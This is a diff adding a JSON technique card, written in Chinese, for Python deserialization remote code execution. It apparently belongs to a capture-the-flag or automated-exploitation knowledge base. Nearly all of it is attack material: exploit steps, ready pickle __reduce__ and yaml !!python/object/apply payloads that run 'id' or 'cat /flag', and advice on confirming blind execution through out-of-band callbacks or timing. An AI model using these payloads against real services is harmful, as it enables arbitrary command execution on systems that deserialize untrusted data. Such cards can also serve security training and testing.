@@ -1,0 +1,47 @@
+{
+  "id": "python-deserialization-rce",
+  "title": "Python 反序列化 RCE（pickle / yaml / 危险 load）",
+  "vuln_pattern": "不可信数据进入 pickle.loads / yaml.load(不安全) / __reduce__ gadget",
+  "fingerprint": [
+    "pickle",
+    "yaml.load",
+    "deserialize",
+    "序列化",
+    "__reduce__",
+    "unserialize",
+    "marshal",
+    "jsonpickle",
+    "序列化数据处理"
+  ],
+  "exploit_steps": [
+    "确认反序列化点与库(pickle/yaml/jsonpickle)",
+    "pickle：构造 __reduce__ 返回 (os.system, ('cmd',)) 的对象，dumps 后投喂",
+    "yaml：用 !!python/object/apply:os.system ['cmd'] 标签(需非 SafeLoader)",
+    "盲打无回显时用 OOB 回调/延时(sleep)做预言机确认执行"
+  ],
+  "key_payloads": [
+    "class E:\\n def __reduce__(self): return (__import__('os').system,('id',))  # pickle.dumps(E())",
+    "!!python/object/apply:os.system ['id']",
+    "!!python/object/apply:subprocess.check_output [['cat','/flag']]"
+  ],
+  "category": "misc",
+  "cve": [],
+  "tags": [
+    "misc",
+    "deserialization",
+    "pickle",
+    "yaml",
+    "rce"
+  ],
+  "source": "original: v2 technique card",
+  "created_ts": 0.0,
+  "preconditions": [
+    "用户可控字节进入 pickle.loads / yaml.load(Loader 非 SafeLoader) / 类似不安全反序列化"
+  ],
+  "verify_oracle": "命令回显(uid=/flag 内容)；盲打则 OOB 回调命中或可测延时",
+  "pitfalls": [
+    "SafeLoader/safe_load 下 yaml 标签不生效——确认用的是不安全 loader",
+    "pickle 协议/Python 版本影响 opcode，用目标同版本构造",
+    "无回显必须用 OOB/时间侧信道"
+  ]
+}
